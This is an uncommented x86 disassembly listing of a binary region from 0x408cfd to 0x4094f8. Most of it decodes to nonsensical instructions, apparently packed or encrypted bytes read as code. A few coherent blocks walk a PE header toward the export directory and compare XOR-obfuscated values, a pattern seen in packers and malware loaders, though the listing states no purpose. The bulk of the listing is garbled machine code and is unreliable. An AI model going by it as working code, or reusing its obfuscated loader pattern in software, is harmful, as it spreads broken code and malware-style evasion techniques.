  408cfd:	jb     0x408d16
  408cff:	test   DWORD PTR [esi+0x42],esi
  408d02:	in     eax,0xda
  408d04:	and    al,0xce
  408d06:	xor    ah,bl
  408d08:	sub    DWORD PTR [ecx],0xffffffff
  408d0b:	jb     0x408cd6
  408d0d:	pop    ss
  408d0e:	xchg   ebp,eax
  408d0f:	inc    edx
  408d10:	cmp    BYTE PTR [ebx-0x4d],ch
  408d13:	mov    dl,0x67
  408d15:	out    0x57,eax
  408d17:	dec    ebx
  408d18:	icebp  
  408d19:	int3   
  408d1a:	sahf   
  408d1b:	fcmovne st,st(1)
  408d1d:	inc    edi
  408d1e:	in     al,dx
  408d1f:	pop    ss
  408d20:	jecxz  0x408d50
  408d22:	pop    ss
  408d23:	pop    es
  408d24:	xchg   ebp,eax
  408d25:	lahf   
  408d26:	into   
  408d27:	test   BYTE PTR [ecx-0x74],dh
  408d2a:	pop    edx
  408d2b:	rep outs dx,DWORD PTR ds:[esi]
  408d2d:	sub    ah,ah
  408d2f:	xchg   ebp,eax
  408d30:	push   ds
  408d31:	mov    al,0xfd
  408d33:	push   0x87901ed5
  408d38:	mov    edi,0xdccc3580
  408d3d:	nop
  408d3e:	sbb    ebx,esi
  408d40:	int3   
  408d41:	mov    dl,0x13
  408d43:	sbb    dl,BYTE PTR [ebx+0x3d]
  408d46:	into   
  408d47:	or     al,0x8e
  408d49:	jge    0x408d40
  408d4b:	mov    bh,0xe8
  408d4d:	fdivr  QWORD PTR [eax+edx*8-0x25d09c90]
  408d54:	inc    ebp
  408d55:	fcom   QWORD PTR [edi+0x6b]
  408d58:	ror    dh,0x90
  408d5b:	fcmove st,st(1)
  408d5d:	(bad)  
  408d5e:	mov    esi,0xb0524853
  408d63:	pop    esp
  408d64:	or     BYTE PTR ds:0xfbf5160a,al
  408d6a:	inc    esp
  408d6b:	dec    esp
  408d6c:	cmp    eax,0xf658506f
  408d71:	shl    BYTE PTR [esp+eiz*2+0x34],cl
  408d75:	cld    
  408d76:	mov    esi,0xc25bfc7d
  408d7b:	loope  0x408d4c
  408d7d:	dec    esi
  408d7e:	ds pop esp
  408d80:	mov    ebx,0xe1806196
  408d85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d86:	test   eax,0xc4e8009f
  408d8b:	pop    ebp
  408d8c:	test   eax,0xe9cb651f
  408d91:	jmp    0x5b37:0xd49015e1
  408d98:	push   ecx
  408d99:	jg     0x408dc4
  408d9b:	add    eax,0xc370a44d
  408da0:	in     al,dx
  408da1:	mov    cl,cl
  408da3:	adc    al,0x9
  408da5:	xor    BYTE PTR [ebp+0x3a],0x4f
  408da9:	div    bl
  408dab:	test   eax,0x71f51950
  408db0:	daa    
  408db1:	mov    dl,0x74
  408db3:	add    al,0x74
  408db5:	mov    bl,0xf7
  408db7:	xchg   edx,eax
  408db8:	jecxz  0x408e0d
  408dba:	test   eax,ebp
  408dbc:	mov    ds:0xb84ef9d,eax
  408dc1:	(bad)  
  408dc4:	stos   DWORD PTR es:[edi],eax
  408dc5:	pop    ecx
  408dc6:	leave  
  408dc7:	mov    WORD PTR [ebp+0x317a90e1],es
  408dcd:	jmp    0x408d53
  408dcf:	sbb    ecx,DWORD PTR [eax-0x54]
  408dd2:	and    ebp,DWORD PTR [ebx+0x40815f40]
  408dd8:	cmp    eax,ebp
  408dda:	push   esp
  408ddb:	cmp    bl,0xc5
  408dde:	dec    ebp
  408ddf:	jg     0x408e4b
  408de1:	in     eax,dx
  408de2:	loope  0x408e0c
  408de4:	push   0xffffff8a
  408de6:	push   0xa8ed28c5
  408deb:	mov    ecx,0x4dc8637d
  408df0:	sbb    dl,BYTE PTR [ebx-0x38]
  408df3:	in     al,dx
  408df4:	xchg   esi,eax
  408df5:	loop   0x408e6c
  408df7:	shl    DWORD PTR [ecx+ecx*4+0x7148b924],1
  408dfe:	xor    al,0xbf
  408e00:	jmp    0xd2b2:0x4c528834
  408e07:	add    DWORD PTR [ebp-0x65],eax
  408e0a:	pushf  
  408e0b:	add    bl,BYTE PTR [ecx+0x1d21cdc7]
  408e11:	stos   DWORD PTR es:[edi],eax
  408e12:	xchg   esi,eax
  408e13:	out    dx,eax
  408e14:	mov    ds:0x96f532f9,eax
  408e19:	stc    
  408e1a:	jnp    0x408e16
  408e1c:	jg     0x408e5f
  408e1e:	sbb    ebx,DWORD PTR [ebx]
  408e20:	test   BYTE PTR [ebx+edx*4+0x42],bl
  408e24:	sub    al,0xe6
  408e26:	mov    ax,WORD PTR [ebp-0x4]
  408e2a:	movzx  eax,ax
  408e2d:	sub    ecx,edi
  408e2f:	cmp    eax,ecx
  408e31:	mov    eax,DWORD PTR [ebp+0x10]
  408e34:	movzx  ecx,WORD PTR [ebp-0x4]
  408e38:	jg     0x408e4d
  408e3e:	xor    eax,esi
  408e40:	sub    ecx,eax
  408e42:	sub    ecx,edi
  408e44:	mov    WORD PTR [ebp-0x4],cx
  408e48:	jmp    0x408e5a
  408e4d:	xor    eax,esi
  408e4f:	lea    eax,[eax+ecx*1+0x32729b]
  408e56:	mov    WORD PTR [ebp-0x4],ax
  408e5a:	mov    eax,DWORD PTR [ebp-0xc]
  408e5d:	cmp    eax,ebx
  408e5f:	je     0x408e73
  408e65:	mov    eax,DWORD PTR [ebp-0x8]
  408e68:	mov    DWORD PTR [eax],0x60341e89
  408e6e:	jmp    0x409836
  408e73:	mov    eax,DWORD PTR [ebp+0x8]
  408e76:	mov    ecx,DWORD PTR [ebp-0x8]
  408e79:	xor    eax,esi
  408e7b:	add    eax,edi
  408e7d:	cmp    DWORD PTR [ecx],eax
  408e7f:	je     0x409149
  408e85:	mov    ecx,DWORD PTR [ebp-0x14]
  408e88:	mov    eax,DWORD PTR [ebp-0x8]
  408e8b:	mov    eax,DWORD PTR [eax]
  408e8d:	mov    eax,DWORD PTR [eax+0x3c]
  408e90:	lea    ecx,[ecx*8+0x78]
  408e97:	add    eax,ecx
  408e99:	mov    ecx,DWORD PTR [ebp-0x8]
  408e9c:	mov    ecx,DWORD PTR [ecx]
  408e9e:	mov    eax,DWORD PTR [eax+ecx*1]
  408ea1:	mov    DWORD PTR [ebp-0x1c],eax
  408ea4:	mov    eax,DWORD PTR [ebp+0x8]
  408ea7:	jmp    0x4090ee
  408eac:	sbb    al,0x56
  408eae:	aam    0xcf
  408eb0:	je     0x408eff
  408eb2:	and    eax,0xfc4f2b75
  408eb7:	adc    eax,0x44b316d1
  408ebc:	or     al,0xd1
  408ebe:	jle    0x408f3e
  408ec0:	and    al,0x7c
  408ec2:	jle    0x408f42
  408ec4:	mov    ds:0x3c6e8459,al
  408ec9:	hlt    
  408eca:	pop    eax
  408ecb:	mov    al,0xde
  408ecd:	xchg   ebx,eax
  408ece:	je     0x408f25
  408ed0:	ror    DWORD PTR [edi],cl
  408ed2:	push   esi
  408ed3:	dec    esi
  408ed4:	push   eax
  408ed5:	adc    BYTE PTR [esi+0x63],ah
  408ed8:	inc    esi
  408ed9:	stc    
  408eda:	pop    es
  408edb:	xchg   edi,eax
  408edc:	mov    edx,0x13d13ae0
  408ee1:	icebp  
  408ee2:	imul   eax,DWORD PTR [edx],0xffffffcd
  408ee5:	add    DWORD PTR [ebx+0x22],eax
  408ee8:	push   esp
  408ee9:	and    edi,edx
  408eeb:	nop
  408eec:	aas    
  408eed:	jbe    0x408f04
  408eef:	retf   
  408ef0:	(bad)  
  408ef1:	xchg   edx,ebp
  408ef3:	adc    eax,0x41f28703
  408ef8:	and    eax,0xcf1a1459
  408efd:	and    eax,0xb5c3d198
  408f02:	sub    eax,0xa5d05d49
  408f07:	mov    ebx,0xaaf8d00b
  408f0c:	lea    eax,[edx+ecx*1+0x7e20756b]
  408f13:	sar    BYTE PTR [edx],0x48
  408f16:	jmp    0x408f85
  408f18:	es aad 0x18
  408f1b:	adc    DWORD PTR ds:0x6f451e8f,edi
  408f21:	cmp    dh,BYTE PTR [ebx-0x4435eb97]
  408f27:	retf   
  408f28:	mov    bl,BYTE PTR [edi+0x37b27466]
  408f2e:	or     eax,esp
  408f30:	adc    eax,0xf0647e16
  408f35:	repz and cl,dh
  408f38:	sub    cl,cl
  408f3a:	loop   0x408f5d
  408f3c:	idiv   BYTE PTR [ecx]
  408f3e:	js     0x408f37
  408f40:	pop    esp
  408f41:	(bad)  
  408f42:	out    0xd1,eax
  408f44:	sahf   
  408f45:	adc    BYTE PTR [ecx-0x7b],dh
  408f48:	pop    ebx
  408f49:	repz pop esp
  408f4b:	cld    
  408f4c:	fisttp WORD PTR [ebp-0x337dadf]
  408f52:	cli    
  408f53:	mov    edx,0x5db40811
  408f58:	sti    
  408f59:	hlt    
  408f5a:	in     al,dx
  408f5b:	cmp    ebp,esi
  408f5d:	jnp    0x408fa3
  408f5f:	push   0x52a01603
  408f64:	lea    ebp,[ebp-0x6913b389]
  408f6a:	in     al,0x3a
  408f6c:	inc    esi
  408f6d:	jno    0x408ef4
  408f6f:	inc    esp
  408f70:	je     0x408fdd
  408f72:	pop    es
  408f73:	pop    esi
  408f74:	xor    ecx,DWORD PTR [ecx-0x6260f460]
  408f7a:	mov    cl,al
  408f7c:	xchg   BYTE PTR [ebp*8+0xe4505c2],dl
  408f83:	sub    al,0x3e
  408f85:	xor    ebp,DWORD PTR [edx+0x4e]
  408f88:	arpl   ax,si
  408f8a:	pop    es
  408f8b:	mov    dl,0x89
  408f8d:	adc    al,0x5c
  408f8f:	repz adc bl,dh
  408f92:	ret    0x4a45
  408f95:	mov    ecx,0x767ec2ed
  408f9a:	cs jmp 0x5f665166
  408fa0:	lds    edi,FWORD PTR [eax]
  408fa2:	inc    esp
  408fa3:	rcl    BYTE PTR [edi],0x67
  408fa6:	into   
  408fa7:	jbe    0x408f3e
  408fa9:	dec    esp
  408faa:	xor    ah,dl
  408fac:	pop    ds
  408fad:	jmp    0x75384708
  408fb2:	sbb    al,0x1b
  408fb4:	retf   0xbbe0
  408fb7:	lahf   
  408fb8:	adc    eax,DWORD PTR [esi-0x6e7c86bd]
  408fbe:	xchg   ebx,eax
  408fbf:	xor    esp,DWORD PTR [ecx]
  408fc1:	rcr    BYTE PTR [edx+esi*8+0x246e20c7],1
  408fc8:	and    eax,0x8b384440
  408fcd:	mov    eax,ds:0xad33a997
  408fd2:	clc    
  408fd3:	inc    eax
  408fd4:	inc    ebp
  408fd5:	xor    al,0x0
  408fd7:	wbinvd 
  408fd9:	int    0x1f
  408fdb:	jmp    0x408f76
  408fdd:	mov    ecx,0x5e803c28
  408fe2:	jmp    0x66f:0xb04d37d
  408fe9:	xchg   ebp,eax
  408fea:	call   0x856d0732
  408fef:	inc    ebx
  408ff0:	xchg   ebp,eax
  408ff1:	outs   dx,DWORD PTR ds:[esi]
  408ff2:	jnp    0x408fd0
  408ff4:	cmp    eax,0x94b962ec
  408ff9:	rcr    DWORD PTR [ebp-0x6c],cl
  408ffc:	ja     0x40901e
  408ffe:	jae    0x40903e
  409000:	jge    0x409016
  409002:	inc    eax
  409003:	out    0xfd,eax
  409005:	inc    ebp
  409006:	into   
  409007:	jge    0x409010
  409009:	pop    esp
  40900a:	les    esp,FWORD PTR ss:[eax]
  40900d:	outs   dx,BYTE PTR ds:[esi]
  40900e:	sub    BYTE PTR [eax+0x46],dl
  409011:	pop    esp
  409012:	shl    ah,0xec
  409015:	mul    esi
  409017:	and    eax,0x690f099c
  40901c:	adc    eax,0x3f237d6d
  409021:	data16 fucomp st(0)
  409024:	sti    
  409025:	sbb    dh,bl
  409027:	push   esp
  409028:	lock dec ebx
  40902a:	les    esi,FWORD PTR [eax+edx*4-0x48]
  40902e:	loope  0x409089
  409030:	pop    ebp
  409031:	jne    0x4090a1
  409033:	push   esi
  409034:	pop    esi
  409035:	stc    
  409036:	shr    DWORD PTR [edi+ebp*4],1
  409039:	and    eax,0x1b89fbac
  40903e:	push   ebp
  40903f:	lods   al,BYTE PTR ds:[esi]
  409040:	sbb    eax,0x17ce5f61
  409045:	inc    edi
  409046:	xchg   esi,eax
  409047:	adc    BYTE PTR [eax+edx*4-0x6c8b04d9],bl
  40904e:	add    ebx,esi
  409050:	add    BYTE PTR [esi],cl
  409052:	mov    eax,0xc5b7e967
  409057:	sub    BYTE PTR [ecx],dl
  409059:	push   cs
  40905a:	in     eax,dx
  40905b:	jns    0x409070
  40905d:	(bad)  
  40905e:	push   eax
  40905f:	ss cld 
  409061:	xchg   ecx,eax
  409062:	add    eax,0x2948b6ff
  409067:	inc    esi
  409068:	jmp    DWORD PTR [edi+0x13]
  40906b:	in     eax,0x6a
  40906d:	mov    dh,0xe0
  40906f:	punpckldq mm3,DWORD PTR [ebx+0x4e]
  409073:	or     BYTE PTR [esi-0x5adc3e8e],bh
  409079:	or     edx,DWORD PTR [edx-0x45aa4217]
  40907f:	repz in al,0x19
  409082:	and    BYTE PTR [edi],cl
  409084:	mov    WORD PTR [ebx-0x34],es
  409087:	iret   
  409088:	out    dx,eax
  409089:	xchg   ebp,eax
  40908a:	mov    edi,0x10e3fd1d
  40908f:	xor    ecx,esp
  409091:	dec    esi
  409092:	mov    ds:0xf4779ca3,al
  409097:	nop
  409098:	or     ecx,DWORD PTR [eax+0x5]
  40909b:	xor    eax,0xf8044a6b
  4090a0:	jns    0x409059
  4090a2:	int    0x4b
  4090a4:	cli    
  4090a5:	sub    eax,0x83ca6cf4
  4090aa:	jmp    0x8c97:0xf0f7778f
  4090b1:	(bad)
  4090b4:	(bad)  
  4090b5:	sub    esi,DWORD PTR [eax-0x69]
  4090b8:	sub    ecx,DWORD PTR [edx]
  4090ba:	mov    ch,0x89
  4090bc:	pop    ds
  4090bd:	dec    esp
  4090be:	jge    0x409072
  4090c0:	lods   al,BYTE PTR ds:[esi]
  4090c1:	xchg   BYTE PTR [esi],ch
  4090c3:	or     ch,BYTE PTR [edi]
  4090c5:	ds pop ebx
  4090c7:	and    eax,0x147c9bea
  4090cc:	pop    es
  4090cd:	outs   dx,DWORD PTR ds:[esi]
  4090ce:	mov    ecx,0xb5805471
  4090d3:	lea    edi,[ebx-0x285bb76b]
  4090d9:	imul   ecx,DWORD PTR [eax],0x5c
  4090dc:	sub    DWORD PTR [ebx+ebx*1-0x5fdbe69b],esi
  4090e3:	mov    dl,0x80
  4090e5:	scas   eax,DWORD PTR es:[edi]
  4090e6:	imul   sp,WORD PTR [ebp-0x67],0x37
  4090eb:	xchg   esp,eax
  4090ec:	int    0x6f
  4090ee:	xor    eax,esi
  4090f0:	add    eax,edi
  4090f2:	mov    DWORD PTR [ebp-0x20],eax
  4090f5:	mov    eax,DWORD PTR [ebp+0x8]
  4090f8:	mov    ecx,DWORD PTR [ebp-0x1c]
  4090fb:	xor    eax,esi
  4090fd:	add    eax,edi
  4090ff:	cmp    ecx,eax
  409101:	je     0x409836
  409107:	mov    eax,DWORD PTR [ebp-0x8]
  40910a:	mov    ecx,DWORD PTR [ebp-0x1c]
  40910d:	add    ecx,DWORD PTR [eax]
  40910f:	mov    DWORD PTR [ebp-0x20],ecx
  409112:	mov    eax,DWORD PTR [ebp-0x20]
  409115:	mov    ecx,DWORD PTR [ebp-0x8]
  409118:	mov    eax,DWORD PTR [eax+0xc]
  40911b:	mov    ecx,DWORD PTR [ecx]
  40911d:	mov    al,BYTE PTR [eax+ecx*1]
  409120:	add    al,0x38
  409122:	xor    al,0x46
  409124:	cmp    al,0xc5
  409126:	je     0x40913d
  40912c:	mov    eax,DWORD PTR [ebp+0x8]
  40912f:	mov    ecx,DWORD PTR [ebp-0x8]
  409132:	xor    eax,esi
  409134:	add    eax,edi
  409136:	mov    DWORD PTR [ecx],eax
  409138:	jmp    0x409836
  40913d:	xor    DWORD PTR [ebp-0xc],0x5fd8f
  409144:	jmp    0x409836
  409149:	mov    eax,DWORD PTR [ebp-0x8]
  40914c:	mov    ecx,DWORD PTR [ebp-0x18]
  40914f:	mov    ecx,DWORD PTR [ecx]
  409151:	jmp    0x409398
  409156:	sbb    eax,0xe1aec100
  40915b:	outs   dx,DWORD PTR ds:[esi]
  40915c:	jno    0x4090ef
  40915e:	out    dx,al
  40915f:	jne    0x4090f6
  409161:	mov    bh,0x3e
  409163:	xor    edx,DWORD PTR ds:0x7edf32c5
  409169:	jle    0x40918f
  40916b:	jl     0x4091eb
  40916d:	jle    0x4091c3
  40916f:	pushf  
  409170:	ficom  DWORD PTR [ecx+ebp*4+0x12290384]
  409177:	push   ss
  409178:	mov    eax,0xdf5b3dd4
  40917d:	inc    edx
  40917e:	clc    
  40917f:	mov    DWORD PTR [eax],esi
  409181:	jno    0x4091bd
  409183:	mov    ds:0xc0fdb3e4,al
  409188:	sub    BYTE PTR [ebx+0x1c],bl
  40918b:	push   edi
  40918c:	test   dh,0x13
  40918f:	pop    eax
  409190:	mov    ch,dh
  409192:	call   0xe5d9:0x6e867305
  409199:	(bad)  
  40919a:	(bad)  
  40919b:	imul   eax,DWORD PTR [edi+0x79e14518],0xe706498f
  4091a5:	lock in eax,0x90
  4091a8:	(bad)  
  4091a9:	fild   QWORD PTR [eax]
  4091ab:	cmp    eax,0xa3fd18a0
  4091b0:	xor    dl,BYTE PTR [ecx]
  4091b2:	nop    ebx
  4091b5:	mov    ch,0xb9
  4091b7:	or     DWORD PTR [edi+0x17],edx
  4091ba:	xor    ch,BYTE PTR [ecx]
  4091bc:	mov    esp,0x89ce98a9
  4091c1:	cmc    
  4091c2:	jnp    0x4091b6
  4091c4:	fs in  al,0x29
  4091c7:	out    0x5b,eax
  4091c9:	cld    
  4091ca:	sub    al,0xef
  4091cc:	mov    bh,0x3a
  4091ce:	(bad)  
  4091d0:	mov    es,WORD PTR [edx-0x2f111673]
  4091d6:	stos   BYTE PTR es:[edi],al
  4091d7:	pop    ebx
  4091d8:	rcr    DWORD PTR [eax+eiz*4-0x4393c0c5],0x85
  4091e0:	push   edx
  4091e1:	add    eax,0xaf0522ec
  4091e6:	enter  0x6368,0x36
  4091ea:	scas   al,BYTE PTR es:[edi]
  4091eb:	push   cs
  4091ec:	sbb    cl,al
  4091ee:	xor    ch,BYTE PTR [eax-0x7c2377bf]
  4091f4:	mov    al,0xce
  4091f6:	adc    al,0x3
  4091f8:	mov    DWORD PTR [edx+0x2ec3a896],ebx
  4091fe:	add    eax,0x511d0961
  409203:	rcl    DWORD PTR [ebx+0x6a],cl
  409206:	ins    BYTE PTR es:[edi],dx
  409207:	cmp    eax,0xf2772a15
  40920c:	(bad)  
  40920d:	dec    esi
  40920e:	adc    al,0x4d
  409210:	test   eax,0x82c4feb2
  409215:	ins    DWORD PTR es:[edi],dx
  409216:	push   0x3054eea4
  40921b:	xor    bl,BYTE PTR [eax]
  40921d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40921e:	sar    DWORD PTR [edi+0x1935d5de],cl
  409224:	(bad)  
  409225:	pop    ss
  409226:	xor    DWORD PTR ds:0x26205840,edx
  40922c:	xor    DWORD PTR [ebp-0x7e723c30],edx
  409232:	inc    esp
  409233:	xchg   BYTE PTR [eax-0x21],ah
  409236:	iret   
  409237:	outs   dx,DWORD PTR ds:[esi]
  409238:	popa   
  409239:	adc    ebx,DWORD PTR cs:[eax+0xcdeac54]
  409240:	push   0x45e49397
  409245:	dec    esi
  409246:	inc    esi
  409247:	jbe    0x409244
  409249:	es xchg ebx,eax
  40924b:	popf   
  40924c:	mov    ebp,0x41e5d015
  409251:	icebp  
  409252:	sub    BYTE PTR [eax-0x77],dh
  409255:	dec    esp
  409256:	mov    ecx,0x8c6fbb02
  40925b:	inc    ecx
  40925d:	leave  
  40925e:	mov    bh,0x49
  409260:	aaa    
  409261:	ins    DWORD PTR es:[edi],dx
  409262:	jg     0x4092cd
  409264:	(bad)  
  409265:	je     0x4092be
  409267:	jbe    0x4091fd
  409269:	or     BYTE PTR [esi],al
  40926b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40926c:	xchg   edi,eax
  40926d:	jg     0x40923d
  40926f:	jbe    0x409228
  409271:	dec    edi
  409272:	mov    dh,0x25
  409274:	and    eax,0xaa13da82
  409279:	fstp   QWORD PTR [ecx+0x792f3772]
  40927f:	mov    ebx,edi
  409281:	fisttp QWORD PTR [esi-0x2b]
  409284:	in     al,dx
  409285:	xor    eax,DWORD PTR [esi+0x4]
  409288:	adc    eax,0xa7a6d96c
  40928d:	cmp    edx,DWORD PTR [ebx]
  40928f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409290:	xchg   esp,eax
  409291:	jmp    0x4092de
  409293:	xor    DWORD PTR [edx-0x58],edi
  409296:	mov    edi,0xf416ef28
  40929b:	iret   
  40929c:	or     DWORD PTR [esi],ecx
  40929e:	adc    al,0x53
  4092a0:	mov    bl,0xc
  4092a2:	xlat   BYTE PTR ds:[ebx]
  4092a3:	sbb    DWORD PTR [edi-0x49],ebp
  4092a6:	push   ecx
  4092a7:	in     eax,0x72
  4092a9:	jne    0x4092ca
  4092ab:	inc    ebp
  4092ac:	rol    DWORD PTR [ebp-0x39a6e0bb],cl
  4092b2:	xchg   BYTE PTR [ebp-0x5e3279ee],cl
  4092b8:	(bad)  
  4092b9:	bound  ecx,QWORD PTR [edx-0x52]
  4092bc:	push   0xffffff9f
  4092be:	add    DWORD PTR [edx-0x4c],edi
  4092c1:	push   eax
  4092c2:	jo     0x4092f3
  4092c4:	dec    ebx
  4092c5:	out    dx,al
  4092c6:	dec    esp
  4092c7:	scas   eax,DWORD PTR es:[edi]
  4092c8:	dec    ecx
  4092c9:	prefetchwt1 BYTE PTR [edx-0x35]
  4092cd:	stos   BYTE PTR es:[edi],al
  4092ce:	ja     0x4092d3
  4092d0:	retf   
  4092d1:	sahf   
  4092d2:	cmp    bl,BYTE PTR [ecx]
  4092d4:	and    DWORD PTR [edx+esi*4-0x9],edx
  4092d8:	xor    ecx,esp
  4092da:	xchg   BYTE PTR [ecx+0x20],dh
  4092dd:	jmp    0x287b3d84
  4092e2:	fisttp DWORD PTR [ebp+0x7b]
  4092e5:	mov    esi,0xa5d48adc
  4092ea:	ret    
  4092eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4092ec:	test   edx,ebp
  4092ee:	cmp    al,0xed
  4092f0:	mov    ebx,DWORD PTR [ebx+ebx*2]
  4092f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4092f5:	loopne 0x409353
  4092f7:	pop    eax
  4092f8:	jae    0x409309
  4092fa:	adc    cl,BYTE PTR [esi]
  4092fc:	jge    0x409366
  4092fe:	mov    ds:0x9ce1b297,eax
  409303:	add    eax,0xb019dce9
  409308:	cmp    BYTE PTR [ecx+0x189d14c0],dl
  40930e:	add    eax,DWORD PTR [ebx+0x5ca0cb48]
  409314:	add    dl,BYTE PTR [esi]
  409316:	fild   DWORD PTR [edx-0x7c]
  409319:	rol    esi,cl
  40931b:	xor    al,0xc4
  40931d:	push   edi
  40931e:	push   ecx
  40931f:	ret    0x56eb
  409322:	(bad)  
  409323:	xchg   edi,eax
  409324:	push   ebx
  409325:	stc    
  409326:	mov    ebp,0xd1b34927
  40932b:	(bad)  
  40932c:	call   0x108cf8e0
  409331:	mov    ds:0x3093e1b9,eax
  409336:	sub    ecx,esp
  409338:	mov    cx,0x913d
  40933c:	not    BYTE PTR [edx+edx*1]
  40933f:	pusha  
  409340:	aaa    
  409341:	mov    cl,0x99
  409343:	enter  0x26ab,0x8f
  409347:	sub    DWORD PTR [ebx-0x10],ebp
  40934a:	repnz test DWORD PTR [esi+0x1],ecx
  40934e:	sti    
  40934f:	jno    0x409384
  409351:	pushw  0xc916
  409355:	pusha  
  409356:	or     eax,0x2de10921
  40935b:	or     DWORD PTR [edx+0x1b40fdb8],edx
  409361:	mov    bl,0x7f
  409363:	test   al,0xcb
  409365:	sbb    DWORD PTR [ebx],ebp
  409367:	fcom   DWORD PTR [ebx+0x2b]
  40936a:	imul   esi,DWORD PTR [ecx-0x6a],0xffffffaf
  40936e:	test   BYTE PTR [eax+0x4e],cl
  409371:	iret   
  409372:	xor    bl,BYTE PTR [ebx+0x391f35b3]
  409378:	stos   BYTE PTR es:[edi],al
  409379:	mov    dl,ch
  40937b:	cmp    BYTE PTR [edi-0x5bc2df79],cl
  409381:	xor    al,0x95
  409383:	push   esp
  409384:	sub    eax,DWORD PTR [ebx+0x27a4fee2]
  40938a:	mov    al,0x2c
  40938c:	xor    esi,DWORD PTR [ebx]
  40938e:	ins    BYTE PTR es:[edi],dx
  40938f:	adc    edx,ecx
  409391:	mov    eax,ds:0x25b40acc
  409396:	xchg   edi,eax
  409397:	fimul  WORD PTR [ecx+0xc458b08]
  40939d:	mov    eax,DWORD PTR [ebp+0x8]
  4093a0:	push   DWORD PTR [ebp-0x8]
  4093a3:	jmp    0x4095ea
  4093a8:	lods   eax,DWORD PTR ds:[esi]
  4093a9:	mov    dl,0xfe
  4093ab:	outs   dx,BYTE PTR ds:[esi]
  4093ac:	xor    DWORD PTR [edx+0x6d],0x15d7aa71
  4093b3:	pop    edi
  4093b4:	pop    es
  4093b5:	jge    0x40934e
  4093b7:	inc    esi
  4093b8:	fcomp  st(5)
  4093ba:	jle    0x40943a
  4093bc:	and    al,0x7c
  4093be:	jle    0x40943e
  4093c0:	xor    al,bh
  4093c2:	test   BYTE PTR [ebp+0x7e6782fb],ch
  4093c8:	lods   al,BYTE PTR ds:[esi]
  4093c9:	sbb    DWORD PTR [eax],0xd64d2f59
  4093cf:	leave  
  4093d0:	loop   0x409421
  4093d2:	shr    cl,cl
  4093d4:	inc    ecx
  4093d5:	adc    ch,BYTE PTR [esi+ecx*8+0x46]
  4093d9:	adc    eax,0xc39eb92a
  4093de:	lock and al,0xe8
  4093e1:	and    DWORD PTR [edi],edi
  4093e3:	sub    al,0x93
  4093e5:	push   0x7
  4093e7:	fwait
  4093e8:	pxor   mm5,QWORD PTR [edx]
  4093eb:	xor    BYTE PTR [ebx-0x3a],cl
  4093ee:	nop
  4093ef:	(bad)  
  4093f0:	pop    ebx
  4093f1:	call   0x97f9:0xd9640373
  4093f8:	stc    
  4093f9:	call   0x5a67:0x665e3450
  409400:	dec    ebx
  409401:	lahf   
  409402:	(bad)  
  409403:	out    dx,al
  409404:	repz cmp edi,eax
  409407:	push   ecx
  409408:	jg     0x409427
  40940a:	adc    eax,0x39141d01
  40940f:	fdivr  st,st(5)
  409411:	and    DWORD PTR [ecx],0x638fde6
  409417:	sbb    dl,ch
  409419:	xchg   DWORD PTR [ebx+0x53868533],esp
  40941f:	(bad)  
  409420:	(bad)  
  409421:	xchg   esp,eax
  409422:	jmp    0x3bfd387d
  409427:	xor    edi,DWORD PTR [edx-0x42]
  40942a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40942b:	xchg   ebx,eax
  40942c:	mov    ah,0x65
  40942e:	loop   0x409443
  409430:	mov    ecx,0xb387b394
  409435:	js     0x4093f6
  409437:	stos   DWORD PTR es:[edi],eax
  409438:	test   esi,esp
  40943a:	push   edx
  40943b:	(bad)  
  40943c:	push   ebp
  40943d:	adc    ecx,DWORD PTR [ebp+ebx*2-0x51e851e6]
  409444:	imul   edx,DWORD PTR [edi-0x6d],0xd39484e
  40944b:	add    ah,BYTE PTR [eax-0x3fe69f23]
  409451:	(bad)  
  409452:	in     al,dx
  409453:	pusha  
  409454:	inc    esp
  409455:	hlt    
  409456:	pop    ebp
  409457:	cmp    eax,0x272b7c54
  40945d:	rol    DWORD PTR [ecx+0x441bb06f],1
  409463:	mov    ax,ds:0x482dea37
  409469:	test   al,0xd9
  40946b:	xor    ebp,eax
  40946d:	inc    ebx
  40946e:	inc    ecx
  40946f:	imul   esi,DWORD PTR [edx],0x51
  409472:	out    dx,eax
  409473:	xor    esp,DWORD PTR [ebp+0x45486b2f]
  409479:	push   ecx
  40947a:	pushf  
  40947b:	(bad)  
  40947c:	stos   BYTE PTR es:[edi],al
  40947d:	test   BYTE PTR [eax-0x76],0x1e
  409481:	and    BYTE PTR [ebx+0x4bab6cba],ch
  409487:	mov    ebx,0xb7b7f3a
  40948c:	in     eax,0x6
  40948e:	test   eax,0x65c94b32
  409493:	fcmovbe st,st(4)
  409495:	sbb    eax,0xa6183c93
  40949a:	pushf  
  40949b:	out    0x3e,al
  40949d:	mov    edi,0x61e6c108
  4094a2:	outs   dx,DWORD PTR ds:[esi]
  4094a3:	jg     0x4094f3
  4094a5:	inc    esi
  4094a6:	mov    ss,WORD PTR [ebx-0x436c96c9]
  4094ac:	nop
  4094ad:	fwait
  4094ae:	mov    DWORD PTR [ecx+0x71],ecx
  4094b1:	inc    ecx
  4094b2:	push   ebx
  4094b3:	add    al,0x30
  4094b5:	dec    esp
  4094b6:	inc    esi
  4094b7:	dec    esp
  4094b8:	je     0x4094d7
  4094ba:	(bad)  
  4094bb:	outs   dx,DWORD PTR ds:[esi]
  4094bc:	xor    DWORD PTR [edx+0x24a8a83b],ebx
  4094c2:	cmp    eax,0xfb385518
  4094c7:	sbb    ebx,eax
  4094c9:	push   ds
  4094ca:	into   
  4094cb:	jle    0x40944f
  4094cd:	bound  ebx,QWORD PTR [eax-0x3378dd3d]
  4094d3:	pop    edx
  4094d4:	push   esi
  4094d5:	cli    
  4094d6:	xor    al,0xe5
  4094d8:	mov    ah,0x3a
  4094da:	mov    al,ds:0x9eb312fb
  4094df:	stos   BYTE PTR es:[edi],al
  4094e0:	mov    dl,0x96
  4094e2:	jbe    0x409535
  4094e4:	imul   edx,esi,0x97e27b69
  4094ea:	enter  0xc29d,0xab
  4094ee:	sbb    BYTE PTR [esi-0x31],0xa2
  4094f2:	enter  0x69a3,0xfd
  4094f6:	or     al,0x23
  4094f8:	bound  eax,QWORD PTR [ebp+0x6dc18461]
